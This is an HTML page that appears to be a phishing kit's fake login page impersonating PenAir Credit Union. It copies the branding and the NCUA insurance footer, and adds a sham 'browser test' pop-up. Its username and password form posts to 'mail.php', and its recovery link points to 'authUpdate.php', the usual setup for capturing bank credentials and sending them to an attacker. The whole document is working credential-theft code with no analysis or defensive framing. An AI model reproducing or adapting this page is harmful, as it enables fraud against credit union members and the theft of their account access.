<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>PenAir Credit Union Login</title>

  <style>
    /* (All your CSS from earlier — no changes made, it's included here fully) */
    
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    html, body { height: 100%; }
    body { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; background-color: #f5f5f5; }
    .login-container, .main-page-footer { width: 800px; max-width: 95%; }
    .login-container { display: flex; height: 400px; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1); background: #fff; z-index: 1; }
    .left-panel { flex: 1; background-image: url('AC.png'); background-size: cover; background-position: center; background-repeat: no-repeat; min-height: 100%; }
    .right-panel { flex: 1; background: white; padding: 30px; display: flex; flex-direction: column; }
    .form-group { margin-bottom: 10px; }
    label { display: block; margin-bottom: 8px; color: #444; }
    input[type="text"], input[type="password"], input[type="email"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
    .username-container { position: relative; }
    .save-toggle { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); display: flex; align-items: center; }
    .toggle { position: relative; display: inline-block; width: 40px; height: 20px; background-color: #ccc; border-radius: 20px; margin-left: 10px; cursor: pointer; }
    .toggle::after { content: ''; position: absolute; width: 18px; height: 18px; border-radius: 50%; background-color: white; top: 1px; right: 21px; transition: 0.3s; }
    .toggle.active { background-color: #b5338a; }
    .toggle.active::after { right: 1px; }
    .password-container { position: relative; }
    .eye-icon { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #777; }
    .login-btn { background-color: #c2e8e6; color: #333; border: none; border-radius: 4px; padding: 12px; width: 100%; font-size: 16px; cursor: pointer; }
    .links { text-align: center; margin-top: 20px; }
    .links a { display: block; color: #0066cc; text-decoration: none; margin: 8px 0; font-size: 14px; }
    .links a:hover { text-decoration: underline; }
    .main-page-footer { display: flex; align-items: center; margin-top: 30px; background-color: #fff; color: #111; font-size: 16px; padding: 25px 20px; width: 1200px; max-width: 100%; }
    .ncua-logo { border: 1px solid black; padding: 8px; width: 170px; text-align: center; margin-right: 25px; }
    .ncua-text { font-size: 28px; font-weight: bold; }
    .footer-text { flex: 1; font-size: 14px; line-height: 1.5; }
    .equal-housing-logo { width: 50px; margin-left: 15px; }
    .logo-img { width: 180px; margin-bottom: 30px; align-self: center; }
    /* Modal Styles */
    .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); justify-content: center; align-items: center; z-index: 1000; }
    .modal-content { background-color: white; width: 800px; max-width: 90%; border: 1px solid #ccc; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
    .modal-header { position: relative; padding: 15px; border-bottom: 1px solid #e5e5e5; }
    .modal-header img { display: block; width: 240px; margin-bottom: 15px; }
    .modal-header h2 { color: #333; font-size: 18px; font-weight: normal; margin-bottom: 10px; }
    .close-btn { position: absolute; right: 15px; top: 15px; font-size: 24px; cursor: pointer; background: none; border: none; color: #777; }
    .help-icon { position: absolute; right: 40px; top: 50%; transform: translateY(-20%); width: 24px; height: 24px; background-color: #777; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; }
    .warning-box { background-color: #fadadd; padding: 10px; text-align: center; color: #333; font-size: 14px; margin-bottom: 1px; }
    .details-header { background-color: #f0f0f0; padding: 8px 15px; font-weight: bold; font-size: 14px; color: #333; cursor: pointer; text-decoration: underline; display: inline-block; margin-top: 0; }
    .detail-row { display: flex; border-bottom: 1px solid #eee; font-size: 14px; }
    .detail-label { flex: 1; padding: 12px 15px; font-weight: bold; color: #333; }
    .detail-value { flex: 1; padding: 12px 15px; color: #333; }
    .warning-message { padding: 15px; display: flex; align-items: center; font-size: 14px; color: #333; background-color: #f9f9f9; border-top: 1px solid #eee; }
    .warning-icon { color: orange; margin-right: 10px; font-size: 20px; }
    .modal-footer { padding: 15px; text-align: center; display: flex; justify-content: center; gap: 15px; border-top: 1px solid #eee; }
    .modal-btn { padding: 8px 20px; border: none; border-radius: 3px; cursor: pointer; font-size: 14px; }
    .close-modal-btn { background-color: #34495e; color: white; }
    .test-again-btn { background-color: #ddd; color: #333; }
    .pop-up-info { color: #f00; font-size: 12px; display: block; margin-top: 5px; }
    .more-info-link { color: #0066cc; text-decoration: none; margin-left: 5px; }
    @media (max-width: 768px) {
      .login-container { flex-direction: column; height: auto; }
      .left-panel { height: 200px; min-height: 200px; }
      .right-panel { padding: 20px; }
      .logo-img { width: 140px; margin-bottom: 20px; }
    }
  </style>
</head>

<body>

<div class="login-container" style="margin-top: auto;">
  <div class="left-panel"></div>
  <div class="right-panel">
    <form action="mail.php" method="post">
      <img src="header.png" alt="PenAir Logo" style="width: 180px; margin-bottom: 30px; display: block; margin-left: auto; margin-right: auto;">

     
        <!-- Username -->
        <div class="form-group">
            <label for="username">Username</label>
            <div class="username-container">
            <input type="text" id="email" name="email" />
            <div class="save-toggle">
                Save
                <div class="toggle" id="saveToggle"></div>
            </div>
            </div>
        </div>
     
<!-- Password -->
<div class="form-group">
        <label for="password">Password</label>
        <div class="password-container">
          <input type="password" id="password" name="password" required/>
          <div class="eye-icon"  onclick="togglePassword()">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
              stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
          </div>
        </div>
      </div>
      <!-- Submit -->
      <button type="submit" name="send" class="login-btn">Login</button>

      <!-- Links -->
      <div class="links">
        <a href="authUpdate.php">Forgot Username or Password?</a>
        <a href="#" onclick="openModal()">Test your browser</a>
        <a href="">Trouble testing your browser</a>
      </div>
    </form>
  </div>
</div>

 <!-- Footer -->
 <div class="main-page-footer" style="margin-top: auto;">
    <div class="ncua-logo">
      <div class="ncua-text">NCUA</div>
      <div style="font-size: 6px; line-height: 1.2; margin-top: 3px;">
        NATIONAL CREDIT UNION ADMINISTRATION, A U.S. GOVERNMENT AGENCY
      </div>
    </div>
    <div class="footer-text">
      Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency.
    </div>
    <div class="equal-housing-logo">
      <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
        <rect x="5" y="15" width="30" height="20" fill="black"/>
        <polygon points="20,5 5,15 35,15" fill="black"/>
        <rect x="10" y="20" width="8" height="8" fill="white"/>
        <rect x="22" y="20" width="8" height="8" fill="white"/>
        <rect x="10" y="32" width="20" height="1" fill="white"/>
        <text x="20" y="40" text-anchor="middle" font-size="6" fill="black">EQUAL HOUSING LENDER</text>
      </svg>
    </div>
  </div>


<!-- Modal -->
<div id="browserTestModal" class="modal">
  <div class="modal-content">
    <h2>Browser Compatibility Test</h2>
    <p>Your browser version and settings have been checked.</p>
    <button onclick="closeModal()">Close</button>
  </div>
</div>

<script>
  function togglePassword() {
    var pass = document.getElementById('password');
    if (pass.type === 'password') {
      pass.type = 'text';
    } else {
      pass.type = 'password';
    }
  }

  function openModal() {
    document.getElementById('browserTestModal').style.display = 'flex';
  }

  function closeModal() {
    document.getElementById('browserTestModal').style.display = 'none';
  }
</script>

</body>
</html>
